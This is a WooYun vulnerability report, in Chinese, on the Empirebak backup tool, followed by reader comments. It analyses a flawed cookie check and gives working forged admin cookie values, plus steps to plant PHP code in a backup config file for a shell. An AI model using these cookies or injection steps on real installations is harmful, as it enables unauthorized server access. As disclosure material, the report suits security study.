{"id": 48101, "wybug_id": "wooyun-2014-078591", "wybug_title": "帝国备份王(Empirebak)万能cookie及拿shell", "wybug_corp": "帝国备份王", "wybug_author": "Flow", "wybug_date": "2014-10-08 12:32", "wybug_open_date": "2015-01-06 12:34", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 帝国备份王(Empirebak)拿shell 详细说明：  1.伪造cookie登录系统(其实这一步多余的,大多用户连密码都没改,都是默认的123456)    登录成功设置4个cookie,看代码\nfunction login($lusername,$lpassword,$key,$lifetime=0){ global $set_username,$set_password,$set_loginauth,$set_loginkey; if(empty($lusername)||empty($lpassword)) { printerror(\"EmptyLoginUser\",\"index.php\"); } //验证码 if(!$set_loginkey) { if($key<>getcvar('checkkey')||empty($key)) { printerror(\"FailLoginKey\",\"index.php\"); } } if(md5($lusername)<>md5($set_username)||md5($lpassword)<>$set_password) { printerror(\"ErrorUser\",\"index.php\"); } //认证码 if($set_loginauth&&$set_loginauth!=$_POST['loginauth']) { printerror(\"ErrorLoginAuth\",\"index.php\"); } $logintime=time(); $rnd=make_password(12);//生成随机字符 $s1=esetcookie(\"bakusername\",$lusername,0); $s2=esetcookie(\"bakrnd\",$rnd,0);//随机字符 $s3=esetcookie(\"baklogintime\",$logintime,0); Ebak_SCookieRnd($lusername,$rnd);// if(!$s1||!$s2) { printerror(\"NotOpenCookie\",\"index.php\"); } printerror(\"LoginSuccess\",\"admin.php\"); }\n再看看make_password函数\nfunction make_password($pw_length){ $low_ascii_bound=50; $upper_ascii_bound=122; $notuse=array(58,59,60,61,62,63,64,73,79,91,92,93,94,95,96,108,111); while($i<$pw_length) { mt_srand((double)microtime()*1000000); $randnum=mt_rand($low_ascii_bound,$upper_ascii_bound); if(!in_array($randnum,$notuse)) { $password1=$password1.chr($randnum); $i++; } } return $password1; }\n 这个函数只是生成随机数,再看看Ebak_SCookieRnd函数\nfunction Ebak_SCookieRnd($username,$rnd){ global $set_loginrnd;//$set_loginrnd为config.php里面的验证随机码 $ckpass=md5(md5($rnd.$set_loginrnd).'-'.$rnd.'-'.$username.'-');//没有把密码加进去,于是漏洞产生了 esetcookie(\"loginebakckpass\",$ckpass,0); }\n下面给出万能cookie(key:value): \nebak_loginebakckpass:119770adb578053dcb383f67a81bcbc6 ebak_bakrnd:35y5cCnnA4Kh ebak_bakusername:admin ebak_baklogintime:4070883661\n 使用以上cookie即可直接访问admin.php 2.拿shell 后台参数设置一般都设置好了,如果不能连接数据库,可以在数据库设置里填个自己的远程数据库 备份数据,随便找个数据库备份, 然后到替换目录文件内容里,选择刚才备份的数据库, 将\"$b_table=\" 替换成 \"phpinfo(); $b_table=\"\n\n这里shell的路径就是bdata/mysql_20141007221849/config.php \n\n   漏洞证明：     修复方案：  一直很佩服崇拜EmpireCMS.   版权声明：转载请注明来源 Flow@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-10-08 14:03 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  万能cookies...太屌了    \n     2014-10-08 15:07 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  不用配置数据库连接可以拿shell么?    \n     2014-10-08 15:58 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  我想知道需要登录么？？    \n     2014-10-09 09:17 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  这个屌。。    \n     2014-10-13 11:56 |    \t\t黑侠 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 帮助别人，等于帮助自己)\t\t \n  帝国 好像很牛，一直不接受wooyun  厂商都无视wooyun，根本不来注册厂商帐号呀。。。。    \n     2014-11-06 01:16 |    \t\t0x7575 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:16        )\t\t \n  不过感觉使用帝国备份的 目前很少见了！    \n     2015-01-06 11:35 |    \t\tsfsgfr \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 没什么好介绍的，一切为了安全)\t\t \n  这个已经这么多天了,还没公开?    \n     2015-02-07 15:10 |    \t\t路飞 \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 上帝恩赐，命运天定。希望之光，普照我身。...)\t\t \n  是什么版本的帝国cms？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}